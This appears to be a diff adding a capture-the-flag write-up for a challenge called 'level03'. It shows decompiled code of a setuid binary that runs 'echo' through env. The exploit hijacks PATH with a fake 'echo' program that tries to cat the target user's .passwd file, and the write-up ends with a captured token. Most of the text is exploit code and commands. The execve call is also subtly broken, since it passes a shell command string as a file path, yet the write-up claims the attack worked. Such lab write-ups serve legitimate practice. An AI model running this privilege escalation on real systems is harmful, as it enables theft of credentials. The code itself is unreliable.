@@ -1,0 +1,44 @@
+*	executable level03
+
+*	send exploit me when run
+
+
+		code :
+		"int main(int argc,char **argv,char **envp)
+
+		{
+		__gid_t __rgid;
+		__uid_t __ruid;
+		int iVar1;
+		gid_t gid;
+		uid_t uid;
+		
+		__rgid = getegid();
+		__ruid = geteuid();
+		setresgid(__rgid,__rgid,__rgid);
+		setresuid(__ruid,__ruid,__ruid);
+		iVar1 = system("/usr/bin/env echo Exploit me");
+		return iVar1;
+		}
+
+* string reveal that he run echo.
+
+* I change the pass to include my executable echo in the path
+* 
+* I create a executable echo : 
+
+		#include <stdlib.h>
+		#include <stdio.h>
+		int main(int argc, char **argv, char **envp)
+		{
+		argv[1] = NULL;
+		execve("/bin/cat $HOME/.passwd",argv, envp);
+		}
+
+*	complile it and name it echo
+
+		./level03
+		change the path to include my executable echo
+		PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
